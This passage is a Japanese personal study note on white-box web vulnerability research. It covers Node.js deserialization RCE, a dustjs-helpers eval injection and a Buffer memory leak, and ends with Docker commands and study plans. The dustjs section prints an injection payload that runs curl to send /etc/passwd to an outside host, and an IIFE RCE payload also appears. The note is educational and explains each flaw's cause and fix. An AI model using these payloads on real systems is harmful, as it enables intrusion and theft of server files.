          // indexOfで"_$$ND_FUNC$$_"の位置を検査。先頭にあるかどうか
          if(obj[key].indexOf(FUNCFLAG) === 0) {
            // ここが脆弱！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！
            // substringで"_$$ND_FUNC$$_"以降の文字を切り出して、evalで実行！
            obj[key] = eval('(' + obj[key].substring(FUNCFLAG.length) + ')');
          } else if(obj[key].indexOf(CIRCULARFLAG) === 0) {
            obj[key] = obj[key].substring(CIRCULARFLAG.length);
            circularTasks.push({obj: obj, key: key});
          }
        }
      }
    }

    if (isIndex) {
      circularTasks.forEach(function(task) {
        task.obj[task.key] = getKeyPath(originObj, task.obj[task.key]);
      });
    }
    return obj;
  };
```
### serialize-to-js (Node.js)
- 概要   
serialize-to-jsモジュールのversion 1.0.0以前で、deserializeメソッドでIIFE形式によるRCEの脆弱性がある。   
https://snyk.io/vuln/npm:serialize-to-js:20170208   
- 例   
以下を挿入するとRCEできる！   
```js
var payload = "{e: function(){ eval('console.log(`exploited`)') }() }";
```
- 対策   
修正されてる。現在のバージョンは
- 根本の原因   
ここに該当のissueがある。   
https://github.com/commenthol/serialize-to-js/commit/1cd433960e5b9db4c0b537afb28366198a319429   
![image](https://user-images.githubusercontent.com/56021519/101511405-fb246280-39bd-11eb-9dd2-468226ae1b2e.png)   
`new Function`によって関数オブジェクトが作成されて、IIFE形式によって作成されたら即実行されてしまう。   
```js
var payload = "{e: function(){ eval('console.log(`exploited`)') }() }";
// もともとの脆弱な実装
var str = (new Function('return ' + payload))();

// 結果
// exploited
```
修正バージョンでは`sanitize()`関数が実装されて、`new`,`eval`,`function`,`(`,`)`のキーワードを構文解析して、あるかどうか調べている。   
![image](https://user-images.githubusercontent.com/56021519/101512873-dda3c880-39be-11eb-8c91-4f159defc157.png)   

## Command Injection
### dustjs-helper (Node.js)
- 概要   
dustというNodeJSのモジュールの中の拡張機能であるdustjs-helper.jsというテンプレートエンジンのための便利メソッドがあるライブラリの中のifメソッドが脆弱だった。   
Javascriptのevalの中にユーザーの入力が入り込んでRCEできてしまう。   
htmlescapeはあるにはあるが、String型にしかチェックがされてないのでArray型にして入力すればHtmlEscape無しに入力できてしまう。   
- 例   

- 発見方法   
`/us/demo/navigation?device=desktop\`(%5c)を入力すると、500 internal errorが発生して、`scripts/node_modules/dustjs-helpers/lib/dust-helpers.js`の`Object.helpers.if`でSyntaxErrorが発生していることがわかる。   
なので、次は`dustjs-helpers/lib/dust-helpers.js`をgithubの公式で読む。   
`/dist`,`/lib`のどっちでも同じっぽい？？   
https://github.com/linkedin/dustjs-helpers/blob/03cd65f51a/dist/dust-helpers.js   
https://github.com/linkedin/dustjs-helpers/blob/03cd65f51a/lib/dust-helpers.js      
![image](https://user-images.githubusercontent.com/56021519/101359047-0eaccc00-38df-11eb-8c19-3e7b986d5b5b.png)   
`if helper`で検索すると該当箇所が見つかり、`eval`があることがわかる。   
if helperの挙動を確認するために、dustjsのgithubの**wiki**の**Dust tutorial**を読む。   
https://github.com/linkedin/dustjs/wiki/Dust-Tutorial#if_condcondition__if_helper_Removed_in_160_release   
見た感じ条件式をevalの中に入れてるっぽいらしい。   
つまり、`\`を入れると、`eval("'desktop\' === 'desktop'")`となってSyntaxErrorとなる。   
![image](https://user-images.githubusercontent.com/56021519/101359923-423c2600-38e0-11eb-875c-ce9b66c0bf69.png)   
任意のコマンドを実行するには`\`以外にも`'`とかも使う必要がある。ので、htmlEscapeする箇所を探して、そこら辺を探す。   
`escape`,`html`とかのキーワードで探すとよさそう？？   
https://github.com/linkedin/dustjs/blob/master/dist/dust-core.js   
どうやら`String`型の時しかEscapeされてないらしい。   
![image](https://user-images.githubusercontent.com/56021519/101360732-69dfbe00-38e1-11eb-9cfd-e98794fedb98.png)   
`?device=desktop`みたいにパラメータを渡す代わりに、`?device[]=1&device[]=2`みたいにして`Array`型でパラメータを渡せばEscapeされずにそのままevalまでたどり着きそう！   
Array型いきなり渡してもいいんだ…！？ふーん。   
`?device[]=x&device[]=y'-require('child_process').exec('curl+-F+"x=`cat+/etc/passwd`"+artsploit.com')-'`   
とするとRCEできるらしい！！！   
これは以下のようになるから。   
```js
// 元はこれ
eval("  ''  == 'desktop'  ")

// 上にPayloadを挿入するとこうなる。-は文字列の引き算？
> eval("  'y'-require('child_process').exec('cat /etc/passwd > ../nodejs/output')-''  == 'desktop'  "); 
false

// +でも-でもどっちでもよさそう
> eval("  'y'+require('child_process').exec('cat /etc/passwd > ../nodejs/output')+''  == 'desktop'  "); 
false
> 
```
- 対策   
evalの入力検証を実装する。htmlEscapeはString型だけじゃなくてすべての型で行う。   
- 参考資料   
https://artsploit.blogspot.com/2016/08/pprce2.html   
https://ibreak.software/2016/08/nodejs-rce-and-a-simple-reverse-shell/   

## Information leak
### new Buffer(100); (Node.js)
- 概要   
Node.jsで以下のように`new Buffer(req.body.text)`でバッファを作成した場合、`req.body.text`の型がString型でない場合、Bufferはnewで使用される前に初期化されないので、サーバーのメモリを返す脆弱性。   
- 例   
```js
> console.log(new Buffer('aaaa'));
<Buffer 61 61 61 61>
undefined
> console.log(new Buffer(100));
<Buffer 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ... 50 more bytes>
undefined
>
```
つまり、ログイン処理で以下のようになっており、POST形式にはJSONが使われている場合、リクエストを細工することでメモリをリークできる。   
```js
        var password = new Buffer(req.body.password);
        if(password.toString('base64') == config.secret_password) {
            req.session.admin = 'yes';
            res.json({'status': 'ok' });
        } else {
            res.json({'status': 'error', 'error': 'password wrong: '+password.toString() });
            
// POSTするデータ
// {"password":"test"} // 文字列"test"を送信。通常
// {"password":100}    // 数値100を送信。Buffer(100)が.toString()によってリークされる
```
- 発見方法   
`new Buffer();`が書かれている箇所を探す。   
- 対策   
`new Bufffer()`は危険なのでBufferの代わりに、Buffer.fromとBuffer.allocとBuffer.allocUnsafeが追加された。   
Buffer.allocUnsafeは初期化されないが、それ以外は初期化されるっぽい。   
- 参考資料   
https://techblog.yahoo.co.jp/advent-calendar-2016/node_new_buffer/   
概要   
https://www.smrrd.de/nodejs-hacking-challenge-writeup.html   
Writeup   
# その他
## githubのOSSのディレクトリ構成
- bin   
プロジェクトで使用する、各種コマンド置き場   
- dist   
コンパイルされたコード/ライブラリ。public/またはbuild/とも呼ばれる。通常、本番用または公共用のファイル。ライブラリ本体置き場（ビルド時に自動作成される）。配付するもの   
- lib   
外部依存関係（直接含まれる場合）。外部ライブラリ置き場   
- include   
C/C++ヘッダー   
- test   
プロジェクトのテストスクリプト、モックなど。性能チェックとか。   
- src   
プロジェクトをビルドおよび開発するための「ソース」ファイル。これは、dist/、public/、またはbuild/にコンパイルされる前の元のソースファイルの場所。   
- examples   
使用例。   
- vendor   
Composerが使用するPHPパッケージのライブラリと依存関係が含まれる。   
- contrib   
他の人からの貢献   
- doc   
ドキュメント   
- man   
マニュアル（Unix/Linux）   
## dockerでの環境構築
### コマンドとかのメモ
以下、Windows10のDockerToolBoxを使用して、Dockerサーバー自体はVirtualBox上のVMで動かすことを想定。   
- `Dockerサーバー起動`   
`Docker QuickStart Terminal`をクリックして起動。いろいろ出るが、VirtualBox上でDockerサーバーを立ち上げてプロンプトが返ってくるまでちょっと待つ。プロンプト自体はWindows10だけど、`docker`コマンドとかで作ったイメージとかは全部VM上に保存される。   
- `docker images`   
今Dockerサーバーに保存されているイメージを表示する。   
- `docker container ls -a`   
今Dockerサーバーに保存されてるコンテナを表示する。   
- `docker-machine ip default`   
DockerサーバーのIPアドレスを確認する。localhostではなくて`192.168.99.100`とか。   
- `docker container run -d --rm -it -p 10080:80 コンテナID`   
今あるDockerコンテナを実行する。`--rm`で起動後そのコンテナを削除する。`-it`でコンテナに対して操作可能とする。`-p 10080:80`でホストOSの10080ポートをDockerサーバーの80ポートに接続する。`-d`でデーモンを起動する。   
- `docker ps`   
今Dockerサーバー上で動いているコンテナを表示する。   
- `docker-machine ssh`   
HostOSからDockerサーバーにSSHログインする。   
- `docker attach 0b5aad08487b`   
HostOSからDockerサーバーのシェルに入る。   
- `docker exec -it c9eb1f0daf24 /bin/sh`   
Dockerコンテナに入る。(Dockerサーバーではない！)   
- `docker build .`   
現在のディレクトリ上にある`Dockerfile`を実行してDockerイメージを作成する。イメージはDockerサーバー上の`/mnt/sda1/var/lib/docker`に保存されている。   
DockerイメージとはOS的なアプリケーションを動かすためのもので、ファイルの内容は変更できない。ファイルの変更が保存されたりするのはイメージレイヤーに追加するコンテナレイヤー側。この二つが合わさってDockerコンテナ。   
- `docker-compose up -d`   
現在のディレクトリ上にある`docker-compose.yml`を実行する。このファイルにはイメージを作成してそれをさらにコンテナにして実行する処理が書かれている。   
コンテナを新規作成する。   
- `docker-compose start`   
既にあるコンテナを起動する。   
- `docker cp my.cnf <コンテナID>:/etc/my.cnf`   
ホストからコンテナ内にファイルを送信する。   
my.cnfを`.`にすれば現在のファイルすべてを送信する。   
ディレクトリを指定すれば、そのディレクトリをそのままコピーして同じ名前のディレクトリを作成して中身のファイルも再帰的に送信する。   
- `docker commit`   
Dockerコンテナをイメージ化する。   
- `docker-compose down`   
コンテナとネットワークを停止、削除する。   
- `docker-compose down --rmi all`  
イメージも削除する。一から作り直すときとか。  
- `docker stop 23fba3fd85c4`   
コンテナを停止する。   
- `docker stop $(docker ps -q)`  
すべてのコンテナを停止する  

### nginx + php-fpm
これが動いている。他はdocker-compose.ymlが間違ってたりnginxのnginx.confが存在していなかったりするので注意。   
https://github.com/mochizukikotaro/docker-nginx-phpfpm/blob/master/README.md   
https://qiita.com/mochizukikotaro/items/b398076cb57492980447   
上の解説記事。   
nginxのconfファイルの以下の`fastcgi-pass`でlocalhostの9000ポートで待機しているPHP-fpmの通信してそこのfastcgiにphpファイルを渡してPHPを実行している。  
なのでnginxのコンテナ上にはphpファイルを置く必要なし。  
```txt
    location ~ \.php$ {
        fastcgi_split_path_info ^(.+\.php)(/.+)$;
        fastcgi_pass php:9000;
```

# メモ
とにかくコードを読みなれている必要があるらしい。それが一番大事っぽい。それが今全然できないしHTBやっててもそれは伸びない気がする。   
まずはudemyとかpentesterAcademyのPHP,NodeJS,.net,JavaのWebアプリ開発コースを受講する必要がありそう。   
あとは脆弱性ごとにそれに該当するコード群と発見方法、着眼点とかを自分なりにまとめる必要がありそう。CVEとかも参考にした方がよさそう。   
受講は2月の春休み開始直後から1カ月でとりたい！それまでにいろいろ計画的に勉強するべし！
XXE,SSTI,C#関係、XSS関係がイマイチ。まだ具体例が少なすぎるからもっと増やす！   
あとある程度理解したらHTBで腕試すのがよさそう？？   

# ToDO
https://github.com/wectf/2020   
https://github.com/TeamHarekaze/HarekazeCTF2019-challenges   

# 参考資料
https://alex-labs.com/my-awae-review-becoming-an-oswe/   
ホワイトボックスの方法論的なことが書いてある。超参考になりそう。   
   
https://stacktrac3.co/oswe-review-awae-course/   
こっちにも方法論的なことが書いてある。   
https://blog.codecamp.jp/programming-docker-image-container   
DockerコンテナとDockerイメージについて   
https://qiita.com/hiyuzawa/items/81490020568417d85e86   
Dockerでの基礎的な操作が大体全部かかれてる   
